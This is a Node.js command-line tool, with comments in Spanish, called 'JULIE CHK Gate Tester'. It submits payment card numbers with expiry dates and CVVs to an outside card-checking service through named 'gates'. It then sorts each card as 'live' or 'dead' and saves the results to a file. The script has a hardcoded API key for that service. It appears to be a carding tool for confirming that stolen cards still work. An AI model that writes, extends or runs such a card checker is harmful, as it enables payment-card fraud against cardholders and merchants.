import axios from 'axios';
import readline from 'readline';
import fs from 'fs';

// ================= API CONFIG =================
const API_URL_CREATE = "https://juliettechk.cc/API_Access/createCheck";
const API_URL_GET = "https://juliettechk.cc/API_Access/getCheck";
const API_KEY = "42f00e13-2c88-44da-8064-c945225d58bb";

// Gates conocidos
const KNOWN_GATES = ["yurei"];

// ================= JULIE API CLASS =================
class JulieAPI {
    constructor(apiKey) {
        this.apiKey = apiKey;
    }

    async createCheck(route, card) {
        const payload = {
            api_key: this.apiKey,
            route: route,
            card: card
        };

        try {
            const response = await axios.post(API_URL_CREATE, payload, {
                timeout: 30000,
                headers: { 'Content-Type': 'application/json' }
            });

            if (response.data && response.data.success) {
                return response.data.task_id;
            }

            throw new Error(JSON.stringify(response.data));
        } catch (error) {
            if (error.response) {
                throw new Error(`API Error: ${JSON.stringify(error.response.data)}`);
            }
            throw error;
        }
    }

    async getCheck(taskId) {
        const payload = {
            api_key: this.apiKey,
            task_id: taskId
        };

        let attempts = 0;
        const maxAttempts = 30;

        while (attempts < maxAttempts) {
            try {
                const response = await axios.post(API_URL_GET, payload, {
                    timeout: 30000,
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.data.response === "processing_task") {
                    attempts++;
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    continue;
                }

                return response.data;
            } catch (error) {
                if (error.response) {
                    throw new Error(`API Error: ${JSON.stringify(error.response.data)}`);
                }
                throw error;
            }
        }

        throw new Error("Timeout: Task took too long");
    }

    async checkCard(route, card) {
        try {
            const taskId = await this.createCheck(route, card);
            const result = await this.getCheck(taskId);

            const status = this.interpretStatus(result.status);
            const message = result.response || "N/A";

            return {
                route: route,
                status: status,
                message: message,
                cc: card,
                success: true
            };
        } catch (error) {
            return {
                route: route,
                status: "error",
                message: error.message,
                cc: card,
                success: false
            };
        }
    }

    interpretStatus(status) {
        if (typeof status === 'boolean') {
            return status ? "live" : "dead";
        }

        const statusStr = String(status).toLowerCase();
        if (statusStr.includes("live") || statusStr.includes("approved")) {
            return "live";
        }
        if (statusStr.includes("dead") || statusStr.includes("declined")) {
            return "dead";
        }

        return statusStr;
    }
}

// ================= GATE TESTER =================
class GateTester {
    constructor(apiKey, testCard) {
        this.api = new JulieAPI(apiKey);
        this.testCard = testCard;
        this.results = [];
    }

    async testSingleGate(route) {
        console.log(`\n[*] Testing: ${route}`);
        console.log(`    Card: ${this.testCard}`);

        const startTime = Date.now();

        const result = await this.api.checkCard(route, this.testCard);

        const elapsed = (Date.now() - startTime) / 1000;
        result.time = elapsed;

        // Mostrar resultado
        if (result.success) {
            const icon = result.status === "live" ? "✅" : result.status === "dead" ? "❌" : "⚠️";
            console.log(`    ${icon} Status: ${result.status}`);
            console.log(`    📝 Response: ${result.message.substring(0, 100)}`);
            console.log(`    ⏱️  Time: ${elapsed.toFixed(2)}s`);
        } else {
            console.log(`    ❌ Error: ${result.message.substring(0, 100)}`);
        }

        this.results.push(result);
        return result;
    }

    async testAllGates(gates) {
        console.log("\n" + "=".repeat(60));
        console.log("🔍 JULIE CHK - GATE TESTER");
        console.log("=".repeat(60));
        console.log(`API Key: ${this.api.apiKey.substring(0, 20)}...`);
        console.log(`Test Card: ${this.testCard}`);
        console.log(`Total Gates: ${gates.length}`);
        console.log("=".repeat(60));

        for (let i = 0; i < gates.length; i++) {
            console.log(`\n[${i + 1}/${gates.length}]`);
            await this.testSingleGate(gates[i]);

            // Pausa entre gates
            if (i < gates.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        this.showSummary();
    }

    async testGatesParallel(gates) {
        console.log("\n" + "=".repeat(60));
        console.log("🚀 JULIE CHK - PARALLEL GATE TESTER");
        console.log("=".repeat(60));
        console.log(`Testing ${gates.length} gates in parallel...`);
        console.log("=".repeat(60));

        const promises = gates.map(route => this.testSingleGate(route));
        await Promise.all(promises);

        this.showSummary();
    }

    showSummary() {
        console.log("\n" + "=".repeat(60));
        console.log("📊 RESUMEN DE RESULTADOS");
        console.log("=".repeat(60));

        const liveGates = this.results.filter(r => r.status === 'live');
        const deadGates = this.results.filter(r => r.status === 'dead');
        const errorGates = this.results.filter(r => r.status === 'error');

        console.log(`Total testeados: ${this.results.length}`);
        console.log(`✅ Live: ${liveGates.length}`);
        console.log(`❌ Dead: ${deadGates.length}`);
        console.log(`⚠️  Error: ${errorGates.length}`);

        if (liveGates.length > 0) {
            console.log(`\n💚 GATES LIVE (${liveGates.length}):`);
            liveGates.forEach(r => {
                console.log(`  • ${r.route}`);
                console.log(`    Response: ${r.message.substring(0, 80)}`);
                console.log(`    Time: ${r.time.toFixed(2)}s`);
            });
        }

        if (errorGates.length > 0) {
            console.log(`\n⚠️  GATES CON ERROR (${errorGates.length}):`);
            errorGates.forEach(r => {
                console.log(`  • ${r.route}`);
                console.log(`    Error: ${r.message.substring(0, 80)}`);
            });
        }

        const avgTime = this.results.reduce((sum, r) => sum + (r.time || 0), 0) / this.results.length;
        console.log(`\n⏱️  Tiempo promedio: ${avgTime.toFixed(2)}s`);
        console.log("=".repeat(60));
    }

    saveResults(filename = "gate_test_results.json") {
        const data = {
            timestamp: new Date().toISOString(),
            test_card: this.testCard,
            total_gates: this.results.length,
            results: this.results
        };

        fs.writeFileSync(filename, JSON.stringify(data, null, 2));
        console.log(`\n💾 Resultados guardados en: ${filename}`);
    }
}

// ================= GATE DISCOVERY =================
async function discoverGates(apiKey, testCard) {
    console.log("\n" + "=".repeat(60));
    console.log("🔍 BUSCANDO GATES DISPONIBLES");
    console.log("=".repeat(60));

    const api = new JulieAPI(apiKey);
    const discoveredGates = [];

    // Intentar gates conocidos
    console.log("\n📋 Probando gates conocidos...");
    for (const gate of KNOWN_GATES) {
        try {
            console.log(`  Testing: ${gate}...`);
            const result = await api.checkCard(gate, testCard);

            if (result.success && !result.message.includes("Invalid") && !result.message.includes("not found")) {
                discoveredGates.push(gate);
                console.log(`  ✅ ${gate} - Funciona!`);
            } else {
                console.log(`  ❌ ${gate} - No funciona`);
            }

            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {
            console.log(`  ❌ ${gate} - Error: ${error.message.substring(0, 50)}`);
        }
    }

    console.log("\n" + "=".repeat(60));
    console.log(`✅ Gates descubiertos: ${discoveredGates.length}`);
    discoveredGates.forEach(gate => console.log(`  • ${gate}`));
    console.log("=".repeat(60));

    return discoveredGates;
}

// ================= MAIN FUNCTIONS =================
async function testAllSequential(apiKey, card, gates) {
    const tester = new GateTester(apiKey, card);
    await tester.testAllGates(gates);
    tester.saveResults();
}

async function testAllParallel(apiKey, card, gates) {
    const tester = new GateTester(apiKey, card);
    await tester.testGatesParallel(gates);
    tester.saveResults();
}

// ================= INTERACTIVE MENU =================
async function interactiveMenu() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const question = (query) => new Promise(resolve => rl.question(query, resolve));

    console.log(`
╔═══════════════════════════════════════════╗
║     JULIE CHK - Gate Tester v1.0          ║
╚═══════════════════════════════════════════╝
    `);

    const apiKey = await question("🔑 API Key (Enter para usar default): ");
    const finalApiKey = apiKey.trim() || API_KEY;

    const card = await question("💳 Tarjeta de prueba (4532015112830366|12|2025|123): ");
    const finalCard = card.trim();

    console.log("\n📋 Opciones:");
    console.log("1. Descubrir gates disponibles");
    console.log("2. Testear gates conocidos (secuencial)");
    console.log("3. Testear gates conocidos (paralelo)");
    console.log("4. Listar gates conocidos");

    const option = await question("\nSelecciona opción (1-4): ");

    rl.close();

    switch (option.trim()) {
        case "1":
            const discovered = await discoverGates(finalApiKey, finalCard);
            if (discovered.length > 0) {
                console.log("\n¿Testear todos los gates descubiertos?");
                await testAllParallel(finalApiKey, finalCard, discovered);
            }
            break;

        case "2":
            await testAllSequential(finalApiKey, finalCard, KNOWN_GATES);
            break;

        case "3":
            await testAllParallel(finalApiKey, finalCard, KNOWN_GATES);
            break;

        case "4":
            console.log("\n📋 GATES CONOCIDOS:");
            KNOWN_GATES.forEach((gate, i) => {
                console.log(`${i + 1}. ${gate}`);
            });
            break;

        default:
            console.log("❌ Opción inválida");
    }
}

// ================= MAIN =================
(async () => {
    // Menú interactivo
    await interactiveMenu();

    // O test directo (descomenta):
    // const TEST_CARD = "4532015112830366|12|2025|123";
    // await testAllParallel(API_KEY, TEST_CARD, KNOWN_GATES);
})();